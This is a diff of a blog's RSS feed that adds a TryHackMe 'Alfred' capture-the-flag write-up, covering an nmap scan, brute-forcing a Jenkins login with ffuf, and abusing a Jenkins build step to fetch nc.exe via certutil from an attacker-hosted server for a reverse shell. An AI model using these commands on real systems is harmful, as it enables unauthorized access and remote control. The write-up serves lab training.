@@ -5,9 +5,216 @@
     <description>Burak Baris</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 27 Dec 2021 21:20:42 +0000</pubDate>
-    <lastBuildDate>Mon, 27 Dec 2021 21:20:42 +0000</lastBuildDate>
+    <pubDate>Tue, 28 Dec 2021 17:20:20 +0000</pubDate>
+    <lastBuildDate>Tue, 28 Dec 2021 17:20:20 +0000</lastBuildDate>
     <generator>Jekyll v4.2.1</generator>
+    
+      <item>
+        <title>Tryhackme Alfred CTF Writeup</title>
+        <description>&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;p&gt;Run Network Mapper (&lt;strong&gt;nmap&lt;/strong&gt;) on Alfred machine to discover opened ports and services.&lt;/p&gt;
+
+&lt;p&gt;Full command :&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;machine IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;outputfile&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Probe open ports to determine service/version info&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;SYN, half TCP scan&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-O&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Enable OS detection&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-T4&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;T{0-5} Set scan speed, higher is faster&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Scan all 65536 ports&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Skip host discovery&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-oN&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Write output to a file&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Output of the scan:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.92 scan initiated Tue Dec 28 09:22:17 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN alfred.nmap 10.10.195.99&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.195.99
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.030s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65532 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 7.5
+3389/tcp open  tcpwrapped
+8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 or Windows 8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 SP1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 8.1 Update 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 8.1 R1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Phone 7.5 or 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 or Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 or 2008 Beta 3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;89%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Tue Dec 28 09:24:13 2021 -- 1 IP address (1 host up) scanned in 115.63 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Three ports are opened:&lt;/p&gt;
+&lt;h2 id=&quot;port-80-http-microsoft-iis-httpd-75&quot;&gt;Port 80 http Microsoft IIS httpd 7.5&lt;/h2&gt;
+&lt;p&gt;Ordinary &lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Information_Services&quot;&gt;&lt;strong&gt;Microsoft IIS&lt;/strong&gt;&lt;/a&gt; web server.
+&lt;br /&gt;Nothing fancy here.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;port-3389-tcpwrapped&quot;&gt;Port 3389 tcpwrapped&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;tcpwrapped&lt;/strong&gt; means that the remote host closed the connection after completing the TCP three-way handshake without receiving any data.
+&lt;br /&gt;&lt;a href=&quot;https://secwiki.org/w/FAQ_tcpwrapped&quot;&gt;&lt;strong&gt;More information here&lt;/strong&gt;.&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;port-8080-jetty-94z-snapshot&quot;&gt;Port 8080 Jetty 9.4.z-SNAPSHOT&lt;/h2&gt;
+
+&lt;p&gt;There is a &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-jenkins/&quot;&gt;&lt;strong&gt;Jenkins&lt;/strong&gt;&lt;/a&gt; login prompt on port 8080.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/3.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+If you google it, you will see the default login credentials for Jenkins is &lt;strong&gt;admin&lt;/strong&gt; for the username and &lt;strong&gt;admin&lt;/strong&gt; for the password.
+However, the system administrator could have changed the password to a different one. In that case default credentials
+would be useless. So we will brute force the credentials for best practice.&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+
+&lt;p&gt;In order to create a continuous HTTP request, we have to know how the HTTP request looks.
+Launch the &lt;a href=&quot;https://www.geeksforgeeks.org/what-is-burp-suite/&quot;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt; to examine the HTTP POST request sent 
+when a login attempt occurs.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/4.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Request&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4&quot;&gt;&lt;strong&gt;application/x-www-form-urlencoded&lt;/strong&gt;&lt;/a&gt; : Encoding type&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;j_username&lt;/strong&gt; : Username field&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;j_password&lt;/strong&gt; : Password Field&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;I will use &lt;a href=&quot;https://cybersecnerds.com/ffuf-everything-you-need-to-know/&quot;&gt;&lt;strong&gt;ffuf&lt;/strong&gt;&lt;/a&gt; to create POST requests toward the web server.
+You can use any fuzzer tool like &lt;strong&gt;THC Hydra&lt;/strong&gt;, &lt;strong&gt;Burp Suite&lt;/strong&gt; or others. 
+&lt;br /&gt;Download &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;&lt;strong&gt;SecLists&lt;/strong&gt;&lt;/a&gt; repo with prepeared wordlists included.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-w&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Dedicated wordlists&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-u&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Target URL&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-data&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Data which will be sent with the request&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-H&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;HTTP headers that will be sent with the request&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-fr&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Regex which will be filtered out&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Full command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; SecLists/Usernames/top-usernames-shortlist.txt:W1,SecLists/Passwords/Common-Credentials/best1050.txt:W2 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.56.186:8080/j_acegi_security_check&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;j_username=W1&amp;amp;j_password=W2&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/x-www-form-urlencoded&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;loginError&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/6.png&quot; alt=&quot;&quot; /&gt;&lt;strong&gt;Cracked the credentials, well done :)&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;
+A possible question would be, why filter out “loginError” string ? 
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/5.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Left: Request - Right:Response&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;
+That sent request got a response with &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302&quot;&gt;&lt;strong&gt;HTTP 302 status code&lt;/strong&gt;&lt;/a&gt;, which is the status code for redirection.
+It means whenever the application receives invalid credentials from the client; the server redirects the client to the “/loginError” URL.
+Based on this, as long as the HTTP response does not include “/loginError” in it, it is safe to say we have sent a valid username-password pair
+to the server.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/7.png&quot; alt=&quot;&quot; /&gt;&lt;strong&gt;Login to the Jenkins panel via credentials.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;It is possible to do anything that Jenkins can do since we have an admin portal right now.However, if we could get a shell from the
+system, it would be amazing.&lt;br /&gt;&lt;br /&gt;
+The way to get a shell from the system is to make Jenkins transmit and execute code in the system shell.&lt;br /&gt;
+Click on the first project named as &lt;strong&gt;project&lt;/strong&gt;, then click &lt;strong&gt;configure&lt;/strong&gt;.
+Scroll down to the bottom, and you will see a box that executes the windows command written in it.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/9.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+On the project page, there is a &lt;strong&gt;Build History&lt;/strong&gt; section. It is available to check the output of the batch command that had run.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/8.png&quot; alt=&quot;&quot; /&gt;
+Now, instead of printing the string value of the user who executes it with the &lt;strong&gt;whoami&lt;/strong&gt; command, we have to connect to that shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;I will use &lt;a href=&quot;https://www.ionos.com/digitalguide/server/tools/netcat/&quot;&gt;&lt;strong&gt;Netcat&lt;/strong&gt;&lt;/a&gt; in this manner. It is required to have Netcat downloaded in both the attacker and the
+victim machine.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Download static &lt;a href=&quot;https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe&quot;&gt;&lt;strong&gt;nc.exe&lt;/strong&gt;&lt;/a&gt; binary for to run it in the victim machine&lt;/li&gt;
+  &lt;li&gt;Start a Python3 server in the directory that includes the Netcat static binary file.
+&lt;br /&gt;Run:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Start a Netcat listener in the attacker machine.
+&lt;br /&gt;Run:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ANY FREE PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Download the static binary to the victim machine from the Python web server and run it.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/nc.exe&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Click &lt;strong&gt;Build&lt;/strong&gt; button on the project page.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/13.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;A get request was made to the web server.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/14.png&quot; alt=&quot;&quot; /&gt;
+Then we got the shell.
+&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/15.png&quot; alt=&quot;&quot; /&gt;&lt;strong&gt;We are in, nice progress ;)&lt;/strong&gt;
+To get user flag, run:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;kr&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Bruce\Desktop\user.txt&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;privilege-escelation&quot;&gt;Privilege Escelation&lt;/h1&gt;
+
+&lt;p&gt;To be continued…&lt;/p&gt;
+</description>
+        <pubDate>Tue, 28 Dec 2021 11:40:00 +0000</pubDate>
+        <link>http://localhost:4000/2021/12/28/tryhackme-alfred-ctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/28/tryhackme-alfred-ctf-writeup/</guid>
+        
+        
+      </item>
     
       <item>
         <title>Unquoted Service Path Vulnerability</title>
